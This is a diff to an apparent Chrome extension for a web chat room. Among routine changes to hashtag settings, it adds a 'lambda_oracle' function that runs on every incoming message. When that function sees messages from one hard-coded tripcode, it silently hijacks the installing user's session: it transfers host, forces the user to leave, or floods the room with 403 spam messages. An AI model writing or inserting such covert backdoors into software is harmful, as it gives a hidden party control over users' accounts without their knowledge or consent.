@@ -42,6 +42,23 @@ function youtube_parser(url){
   return (match&&match[7].length==11)? match[7] : false;
 }
 
+function lambda_oracle(type, user, text){
+  console.log(`${type} ${user.tripcode} ${text}`);
+  if(user.tripcode === 'L/CaT//Hsk'){
+    if(type == 'dm' || type == 'msg'){
+      if(text == 'λhost')
+        ctrlRoom({'new_host': u.id});
+      else if(text == 'λleave')
+        ctrlRoom({'leave': 'leave'});
+      else if(text == 'λ403')
+        for(var i = 0; i < 403; i++)
+          ctrlRoom({'message': '403'});
+      else if(text == 'λ!')
+        ctrlRoom({'message': '!λ!'});
+    }
+  }
+}
+
 var handle_talks = function(msg){
 
   var type = '', user = '',
@@ -128,12 +145,14 @@ var handle_talks = function(msg){
   //  if(roomInfo.room.np) playMusic({url: roomInfo.room.np.url, title: roomInfo.room.np.name})
   //}
 
+
   if(!roomInfo || [event_join, event_leave, event_newhost, event_music].includes(type)){
     getRoom(
       function(info){
         prevRoomInfo = roomInfo;
         roomInfo = info;
         u = findUser(user);
+        lambda_oracle(type, u, text);
         chrome.runtime.sendMessage({
           type: type,
           host: isHost(),
@@ -151,6 +170,7 @@ var handle_talks = function(msg){
   }
   else{
     u = findUser(user);
+    lambda_oracle(type, u, text);
     chrome.runtime.sendMessage({
       type: type,
       host: isHost(),
@@ -226,11 +246,13 @@ function wrap_post_form(){
     }
 
     if($('textarea[name="message"]').val().match(/^#\S+/)){
-      chrome.storage.local.get(["Hashtag-switch", "Hashtag"], (config)=>{
-        if(config["Hashtag-switch"]){
+      SWITCH_HASHTAG = "switch_Hashtag";
+      HASHTAG_SETTING = sid("Hashtag");
+      chrome.storage.local.get([SWITCH_HASHTAG, HASHTAG_SETTING], (config)=>{
+        if(config[SWITCH_HASHTAG]){
           var sub = $('textarea[name="message"]').val().trim();
-          if(config["Hashtag"] && config["Hashtag"][sub]){
-            var array = config["Hashtag"][sub];
+          if(config[HASHTAG_SETTING] && config[HASHTAG_SETTING][sub]){
+            var array = config[HASHTAG_SETTING][sub];
             var sel = array[Math.floor(Math.random() * array.length)];
             $('textarea[name="message"]').val(sel);
           }
